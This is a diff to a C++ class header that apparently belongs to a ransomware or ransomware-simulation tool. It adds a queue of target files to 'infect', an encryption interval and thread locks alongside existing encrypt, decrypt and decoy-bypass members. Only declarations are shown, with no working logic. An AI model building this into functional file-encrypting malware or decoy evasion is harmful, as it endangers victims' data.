@@ -46,15 +46,19 @@ public:
 	int m_numTotal;
 	int m_numInfected;
 	vector<FILE_LOG> m_listFileLog; // packet list
+	bool m_isEncryptReady;
 
 	list<CString> m_listFileExt; // 파일 확장자
+	queue<CString> m_queueTargetFiles; // 감염 대상 파일
 	list<CString> m_listInfectedFiles; // 감염된 파일
 
-	CRITICAL_SECTION m_cs;
+	CRITICAL_SECTION m_csFileLog;
+	CRITICAL_SECTION m_csFileQueue;
 
 	// Settings
 	int m_cryptKey;
 	int m_cryptType;
+	int m_cryptInterval; // ms
 	bool m_bBypassDecoy;
 
 
@@ -89,4 +93,5 @@ public:
 	bool CreateListFile();
 	bool EncryptFileRs(CString strPath);
 	bool DecryptFileRs();
+	afx_msg void OnDestroy();
 };
